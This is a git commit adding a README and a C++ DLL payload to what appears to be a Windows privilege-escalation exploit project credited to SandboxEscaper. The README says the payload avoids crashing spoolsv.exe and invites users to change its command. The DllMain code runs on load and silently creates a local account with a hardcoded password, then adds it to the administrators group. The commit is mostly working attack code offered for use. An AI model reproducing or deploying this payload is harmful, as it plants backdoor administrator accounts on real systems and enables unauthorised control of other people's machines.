1763939dbaf5afd4c9926b9fc82f1da2f64f249c
jackson5 <katsu@katsu-sec.net>
2018-08-29 01:00:55 -0700

    Push payload

---
+++ README.md
@@ -0,0 +1,5 @@
+All credit goes to SandboxEscaper.
+
+Added a payload.dll (exploit.dll in the project) that adds local admin using WinExec
+
+This won't crash spoolsv.exe unlike msf and cobalt payloads. Modify the command to suit your needs. Use ur imagination.
---
+++ payload/dllmain.cpp
@@ -0,0 +1,18 @@
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		WinExec("cmd.exe /C net user wintadmin1 Password6789 /add && net localgroup administrators wintadmin1 /add >NUL 2>&1", 0);
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
